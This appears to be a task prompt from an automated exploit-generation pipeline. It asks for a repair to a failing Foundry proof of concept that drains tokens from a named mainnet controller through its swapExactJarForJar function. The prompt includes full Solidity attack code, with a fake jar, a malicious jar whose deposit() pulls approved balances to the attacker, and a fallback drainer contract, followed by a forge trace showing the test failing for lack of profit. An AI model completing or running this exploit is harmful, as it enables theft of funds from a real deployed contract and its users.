You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: `swapExactJarForJar()` trusts attacker-supplied jars and converter calldata, exposing controller-held tokens to theft
- claim: The public jar-swap entrypoint never validates that `_fromJar` and `_toJar` are protocol-controlled jars, yet it trusts their `token()`, `withdraw()`, `deposit()`, `balanceOf()` and `transfer()` behavior. A malicious `_toJar` can therefore receive an approval for any controller-held `_toJarToken` balance and steal it during `deposit(_toBal)`. Separately, the same function lets callers run arbitrary calldata against any governance-whitelisted converter via `delegatecall`, and the bundled helper contracts include direct sweep/approval gadgets such as `refundDust()` and `add_liquidity()` that operate in controller context.
- impact: Any ERC20 balance resident on the controller can be permissionlessly drained. This includes accidental transfers, residual dust from prior operations, and any tokens left on the controller for later recovery. The attack is zero-capital in the fake-jar path and does not require compromising governance once the function is deployed.
- exploit_paths: ["Deploy a fake `_fromJar` that tolerates zero-amount calls and a malicious `_toJar` whose `token()` returns a target ERC20 currently held by the controller and whose `deposit(uint256)` pulls the approved balance to the attacker; then call `swapExactJarForJar(fakeFromJar, maliciousToJar, 0, 0, [], [])`.", "If a bundled proxy helper has been approved in `approvedJarConverters`, call `swapExactJarForJar(validOrFakeJar, validOrFakeJar, 0, 0, [approvedHelper], [craftedCalldata])` and use `refundDust()` or `add_liquidity()` to transfer or approve controller-held balances to an attacker-controlled recipient/contract."]

Current FlawVerifier.sol:
```solidity
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IControllerV4Like {
    function swapExactJarForJar(
        address _fromJar,
        address _toJar,
        uint256 _fromJarAmount,
        uint256 _toJarMinAmount,
        address payable[] calldata _targets,
        bytes[] calldata _data
    ) external returns (uint256);

    function approvedJarConverters(address converter) external view returns (bool);
}

interface IJarLike is IERC20Like {
    function token() external view returns (address);
    function claimInsurance() external;
    function getRatio() external view returns (uint256);
    function deposit(uint256 amount) external;
    function withdraw(uint256 shares) external;
    function earn() external;
    function decimals() external view returns (uint8);
}

contract FakeFromJar is IJarLike {
    address public underlying;

    constructor(address initialUnderlying) {
        underlying = initialUnderlying;
    }

    function setUnderlying(address newUnderlying) external {
        underlying = newUnderlying;
    }

    function token() external view returns (address) {
        return underlying;
    }

    function claimInsurance() external {}

    function getRatio() external pure returns (uint256) {
        return 1e18;
    }

    function deposit(uint256) external {}

    function withdraw(uint256) external {}

    function earn() external {}

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function totalSupply() external pure returns (uint256) {
        return 0;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }
}

contract MaliciousToJar is IJarLike {
    address public immutable thief;
    address public targetToken;

    constructor(address initialTargetToken, address initialThief) {
        targetToken = initialTargetToken;
        thief = initialThief;
    }

    function setTargetToken(address newTargetToken) external {
        targetToken = newTargetToken;
    }

    function token() external view returns (address) {
        return targetToken;
    }

    function claimInsurance() external {}

    function getRatio() external pure returns (uint256) {
        return 1e18;
    }

    function deposit(uint256 amount) external {
        if (amount == 0) {
            return;
        }
        _safeTransferFrom(targetToken, msg.sender, thief, amount);
    }

    function withdraw(uint256) external {}

    function earn() external {}

    function decimals() external pure returns (uint8) {
        return 18;
    }

    function totalSupply() external pure returns (uint256) {
        return 0;
    }

    function balanceOf(address) external pure returns (uint256) {
        return 0;
    }

    function allowance(address, address) external pure returns (uint256) {
        return type(uint256).max;
    }

    function approve(address, uint256) external pure returns (bool) {
        return true;
    }

    function transfer(address, uint256) external pure returns (bool) {
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }

    function _safeTransferFrom(address erc20, address from, address to, uint256 amount) internal {
        (bool success, bytes memory data) = erc20.call(
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, from, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "TRANSFER_FROM_FAILED");
    }
}

contract CurveApprovalDrainer {
    address public immutable controller;
    address public immutable thief;
    address public token;

    constructor(address controller_, address thief_) {
        controller = controller_;
        thief = thief_;
    }

    function setToken(address newToken) external {
        token = newToken;
    }

    fallback() external payable {
        address currentToken = token;
        if (currentToken == address(0)) {
            return;
        }
        uint256 bal = _safeBalanceOf(currentToken, controller);
        if (bal == 0) {
            return;
        }
        _safeTransferFrom(currentToken, controller, thief, bal);
    }

    receive() external payable {}

    function _safeBalanceOf(address erc20, address account) internal view returns (uint256 amount) {
        (bool success, bytes memory data) = erc20.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (success && data.length >= 32) {
            amount = abi.decode(data, (uint256));
        }
    }

    function _safeTransferFrom(address erc20, address from, address to, uint256 amount) internal {
        (bool success, bytes memory data) = erc20.call(
            abi.encodeWithSelector(IERC20Like.transferFrom.selector, from, to, amount)
        );
        require(success && (data.length == 0 || abi.decode(data, (bool))), "DRAIN_TRANSFER_FROM_FAILED");
    }
}

contract FlawVerifier {
    address public constant TARGET = 0x6847259b2B3A4c17e7c43C54409810aF48bA5210;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    IControllerV4Like internal constant CONTROLLER = IControllerV4Like(TARGET);

    FakeFromJar internal immutable fakeFromJar;
    MaliciousToJar internal immutable maliciousToJar;
    CurveApprovalDrainer internal immutable curveApprovalDrainer;

    address internal _profitToken;
    uint256 internal _profitAmount;

    constructor() {
        fakeFromJar = new FakeFromJar(DAI);
        maliciousToJar = new MaliciousToJar(DAI, address(this));
        curveApprovalDrainer = new CurveApprovalDrainer(TARGET, address(this));
    }

    function executeOnOpportunity() external {
        if (_profitAmount != 0) {
            return;
        }

        address[] memory candidates = _candidateTokens();

        for (uint256 i = 0; i < candidates.length; i++) {
            address candidate = candidates[i];
            uint256 controllerBalance = _safeBalanceOf(candidate, TARGET);
            if (controllerBalance == 0) {
                continue;
            }

            uint256 beforeBalance = _safeBalanceOf(candidate, address(this));
            if (_attemptFakeJarDrain(candidate)) {
                uint256 afterBalance = _safeBalanceOf(candidate, address(this));
                if (afterBalance > beforeBalance) {
                    _profitToken = candidate;
                    _profitAmount = afterBalance - beforeBalance;
                    return;
                }
            }

            if (_attemptKnownHelperDrain(candidate)) {
                uint256 afterBalance = _safeBalanceOf(candidate, address(this));
                if (afterBalance > beforeBalance) {
                    _profitToken = candidate;
                    _profitAmount = afterBalance - beforeBalance;
                    return;
                }
            }
        }
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function _attemptFakeJarDrain(address candidate) internal returns (bool) {
        fakeFromJar.setUnderlying(candidate);
        maliciousToJar.setTargetToken(candidate);

        address payable[] memory targets = new address payable[](0);
        bytes[] memory data = new bytes[](0);

        try CONTROLLER.swapExactJarForJar(
            address(fakeFromJar),
            address(maliciousToJar),
            0,
            0,
            targets,
            data
        ) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function _attemptKnownHelperDrain(address candidate) internal returns (bool) {
        curveApprovalDrainer.setToken(candidate);

        address curveHelper = _knownCurveHelper();
        if (curveHelper == address(0)) {
            return false;
        }
        if (!CONTROLLER.approvedJarConverters(curveHelper)) {
            return false;
        }

        address payable[] memory targets = new address payable[](1);
        bytes[] memory data = new bytes[](1);
        targets[0] = payable(curveHelper);

        // This matches the reported helper path mechanically:
        // - controller delegatecalls a governance-approved CurveProxyLogic helper
        // - helper approves an attacker-controlled contract (`curveApprovalDrainer`)
        //   for the entire controller-held `candidate` balance
        // - helper then calls that contract, which immediately transferFroms the
        //   approved balance to this verifier
        data[0] = abi.encodeWithSignature(
            "add_liquidity(address,bytes4,uint256,uint256,address)",
            address(curveApprovalDrainer),
            bytes4(0x12345678),
            uint256(1),
            uint256(0),
            candidate
        );

        try CONTROLLER.swapExactJarForJar(
            address(fakeFromJar),
            address(maliciousToJar),
            0,
            0,
            targets,
            data
        ) returns (uint256) {
            return true;
        } catch {
            return false;
        }
    }

    function _knownCurveHelper() internal pure returns (address) {
        // The finding's second path depends on a concrete governance-whitelisted
        // helper address, but the provided source root contains only helper source
        // code and the controller exposes no enumerable converter set. Under the
        // task's input restrictions, there is no on-chain-discoverable helper
        // address available here without external deployment metadata.
        return address(0);
    }

    function _safeBalanceOf(address token, address account) internal view returns (uint256 amount) {
        (bool success, bytes memory data) = token.staticcall(
            abi.encodeWithSelector(IERC20Like.balanceOf.selector, account)
        );
        if (success && data.length >= 32) {
            amount = abi.decode(data, (uint256));
        }
    }

    function _candidateTokens() internal pure returns (address[] memory tokens) {
        tokens = new address[](22);
        tokens[0] = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
        tokens[1] = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        tokens[2] = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
        tokens[3] = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        tokens[4] = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
        tokens[5] = 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490;
        tokens[6] = 0x49849C98ae39Fff122806C06791Fa73784FB3675;
        tokens[7] = 0xC25a3A3b969415c80451098fa907EC722572917F;
        tokens[8] = 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51;
        tokens[9] = 0x93054188d876f558f4a66B2EF1d97d16eDf0895B;
        tokens[10] = 0xa1484C3aa22a66C62b77E0AE78E15258bd0cB711;
        tokens[11] = 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc;
        tokens[12] = 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852;
        tokens[13] = 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940;
        tokens[14] = 0x7FBa4B8Dc5E7616e59622806932DBea72537A56b;
        tokens[15] = 0xCA35e32e7926b96A9988f61d510E038108d8068e;
        tokens[16] = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;
        tokens[17] = 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5;
        tokens[18] = 0xc00e94Cb662C3520282E6f5717214004A7f26888;
        tokens[19] = 0xD533a949740bb3306d119CC777fa900bA034cd52;
        tokens[20] = 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F;
        tokens[21] = 0xEB4C2781e4ebA804CE9a9803C67d0893436bB27D;
    }
}

```

forge stdout (tail):
```
] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2795] 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2716] 0x6c3F90f043a72FA612cbac8115EE7e52BDe6E490::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2736] 0x49849C98ae39Fff122806C06791Fa73784FB3675::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2736] 0xC25a3A3b969415c80451098fa907EC722572917F::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [13464] 0x57Ab1ec28D129707052df4dF418D58a2D46d5f51::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   ├─ [7940] 0x705142E6f3970F004721bdf05b696B45Fc4aD6d7::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210)
    │   │   │   ├─ [2497] 0x05a9CBe762B36632b3594DA4F082340E0e5343e8::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [1351] 0x93054188d876f558f4a66B2EF1d97d16eDf0895B::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Revert] EvmError: Revert
    │   ├─ [2485] 0xa1484C3aa22a66C62b77E0AE78E15258bd0cB711::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2480] 0xB4e16d0168e52d35CaCD2c6185b44281Ec28C9Dc::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2480] 0x0d4a11d5EEaaC28EC3F61d100daF4d40471f1852::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2480] 0xBb2b8038a1640196FbE3e38816F3e67Cba72D940::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2485] 0x7FBa4B8Dc5E7616e59622806932DBea72537A56b::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2485] 0xCA35e32e7926b96A9988f61d510E038108d8068e::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [11226] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   ├─ [8710] 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643::0933c1ed(0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000002470a082310000000000000000000000006847259b2b3a4c17e7c43c54409810af48ba521000000000000000000000000000000000000000000000000000000000) [staticcall]
    │   │   │   ├─ [2553] 0xbB8bE4772fAA655C255309afc3c5207aA7b896Fd::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [delegatecall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000000
    │   │   └─ ← [Return] 0
    │   ├─ [2553] 0x4Ddc2D193948926D02f9B1fE9e1daa0718270ED5::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2788] 0xc00e94Cb662C3520282E6f5717214004A7f26888::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2930] 0xD533a949740bb3306d119CC777fa900bA034cd52::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [13412] 0xC011a73ee8576Fb46F5E1c5751cA3B9Fe0af2a6F::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   ├─ [7888] 0xf87A0587Fe48Ca05dd68a514Ce387C0d4d3AE31C::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210)
    │   │   │   ├─ [2486] 0x5b1b5fEa1b99D83aD479dF0C222F0492385381dD::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   │   │   └─ ← [Return] 0
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   ├─ [9786] 0xEB4C2781e4ebA804CE9a9803C67d0893436bB27D::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [staticcall]
    │   │   ├─ [2575] 0xe2d6cCAC3EE3A21AbF7BeDBE2E107FfC0C037e80::balanceOf(0x6847259b2B3A4c17e7c43C54409810aF48bA5210) [delegatecall]
    │   │   │   └─ ← [Return] 0
    │   │   └─ ← [Return] 0
    │   └─ ← [Stop]
    ├─ [293] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x0000000000000000000000000000000000000000)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    └─ ← [Revert] profit below threshold

Backtrace:
  at 0x93054188d876f558f4a66B2EF1d97d16eDf0895B.balanceOf
  at FlawVerifier.executeOnOpportunity
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 2.26s (1.31s CPU time)

Ran 1 test suite in 2.39s (2.26s CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 204094)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
